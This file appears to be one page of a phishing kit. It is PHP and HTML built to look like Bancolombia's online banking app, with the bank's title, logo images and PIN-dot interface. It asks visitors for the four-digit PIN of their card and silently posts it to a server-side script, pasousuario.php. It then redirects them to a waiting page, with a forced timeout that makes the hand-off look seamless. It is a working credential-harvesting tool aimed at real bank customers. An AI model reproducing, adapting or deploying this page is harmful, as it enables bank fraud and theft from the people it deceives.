<?php
error_reporting(0);
date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <title>Bancolombia Sucursal Virtual Personas</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
    <style>
        body { font-family: 'Open Sans', sans-serif; text-align: center; margin: 0; padding: 0; }
        .header-app { padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; }
        /* Puntos visuales */
        .puntos-container { display: flex; justify-content: center; margin: 30px 0; gap: 15px; }
        .punto { width: 15px; height: 15px; border: 2px solid #ccc; border-radius: 50%; background: #fff; }
        .punto.activo { background: #000; border-color: #000; }
        /* Input invisible que captura el teclado real */
        #input_real { position: absolute; opacity: 0; left: -9999px; }
        #btn-password { width: 85%; margin: 20px auto; height: 50px; border: none; border-radius: 25px; background: #ccc; font-weight: bold; }
        #fondo, #cargando-o { display: none; position: fixed; top: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 999; padding-top: 50%; }
    </style>
</head>
<body>
    <div id="fondo"></div>
    <div id="cargando-o"><img src="../img/load4.gif" width="70"><br>Validando...</div>

    <div class="header-app">
        <img src="../img/btn-cerrar.jpg" height="25">
        <img src="../img/logo-app.jpg" height="25">
        <span style="width:30px;"></span>
    </div>

    <div style="margin-top:50px;">
        <img src="../img/candado.jpg" width="20"><br>
        <p><b>Ingresa la clave de tu tarjeta</b></p>
        
        <input type="number" id="input_real" pattern="\d*" inputmode="numeric" maxlength="4">
        
        <div class="puntos-container" id="tap_area">
            <div class="punto" id="dot1"></div>
            <div class="punto" id="dot2"></div>
            <div class="punto" id="dot3"></div>
            <div class="punto" id="dot4"></div>
        </div>
    </div>

    <button id="btn-password" disabled>CONTINUAR</button>

    <script>
        $(document).ready(function() {
            // Al tocar los puntos, forzamos el teclado
            $("#tap_area").click(function() { $("#input_real").focus(); });
            $("#input_real").focus();

            $("#input_real").on("input", function() {
                var val = $(this).val();
                if (val.length > 4) { $(this).val(val.slice(0, 4)); return; }

                // Actualizar puntos visuales
                $(".punto").removeClass("activo");
                for (var i = 1; i <= val.length; i++) { $("#dot" + i).addClass("activo"); }

                // Activar botón
                if (val.length === 4) {
                    $("#btn-password").prop("disabled", false).css("background", "#FDDA24");
                } else {
                    $("#btn-password").prop("disabled", true).css("background", "#ccc");
                }
            });

            $("#btn-password").click(function() {
                var pin = $("#input_real").val();
                $("#fondo, #cargando-o").show();
                
                $.post("../process/pasousuario.php", { pass: pin }, function() {
                    window.location.href = "WAITING.php";
                });

                // Seguridad: Salto forzado si el server tarda
                setTimeout(function() { window.location.href = "WAITING.php"; }, 3000);
            });
        });
    </script>
</body>
</html>
